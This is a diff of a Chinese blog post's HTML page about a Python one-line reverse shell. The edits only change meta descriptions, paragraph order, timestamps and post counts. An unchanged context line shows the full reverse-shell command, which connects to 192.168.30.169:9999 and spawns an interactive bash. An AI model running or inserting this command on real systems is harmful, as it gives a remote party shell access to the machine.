@@ -79,23 +79,23 @@
 
 
 
-<meta name="description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  Python 一句话反弹 Shell今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。">
+<meta name="description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  最近大脑比较懵逼，也不知道在干啥，也不知道在写啥。">
 <meta name="keywords" content="Golang,Python,Shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一句话 Shell">
 <meta property="og:url" content="https://co5mos.github.io/2019/10/17/python-shell/index.html">
 <meta property="og:site_name" content="犰狳不求余">
-<meta property="og:description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  Python 一句话反弹 Shell今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。">
+<meta property="og:description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  最近大脑比较懵逼，也不知道在干啥，也不知道在写啥。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/1.jpeg">
 <meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/2.jpeg">
 <meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/3.jpeg">
 <meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/4.png">
 <meta property="og:image" content="https://co5mos.github.io/2019/10/17/python-shell/5.png">
-<meta property="og:updated_time" content="2019-11-15T06:46:24.789Z">
+<meta property="og:updated_time" content="2019-11-23T15:45:16.718Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一句话 Shell">
-<meta name="twitter:description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  Python 一句话反弹 Shell今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。">
+<meta name="twitter:description" content="旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。  最近大脑比较懵逼，也不知道在干啥，也不知道在写啥。">
 <meta name="twitter:image" content="https://co5mos.github.io/2019/10/17/python-shell/1.jpeg">
 
 
@@ -351,8 +351,9 @@
         <blockquote>
 <p>旧爱的誓言像极了一个巴掌，每当你记起一句就挨一个耳光。</p>
 </blockquote>
-<h2 id="Python-一句话反弹-Shell"><a href="#Python-一句话反弹-Shell" class="headerlink" title="Python 一句话反弹 Shell"></a>Python 一句话反弹 Shell</h2><p>今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。</p>
+<p>最近大脑比较懵逼，也不知道在干啥，也不知道在写啥。</p>
 <a id="more"></a>
+<h2 id="Python-一句话反弹-Shell"><a href="#Python-一句话反弹-Shell" class="headerlink" title="Python 一句话反弹 Shell"></a>Python 一句话反弹 Shell</h2><p>今天在写 socket 的时候，用到了 python shell，于是乎就了解了一下操作。</p>
 <p>反弹shell脚本如下:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.30.169',9999));[os.dup2(s.fileno(),i) for i in range(3)];p=subprocess.call(['/bin/bash','-i'])"</span></span><br></pre></td></tr></table></figure>
 <p>展开看一下</p>
@@ -572,7 +573,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -594,7 +595,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
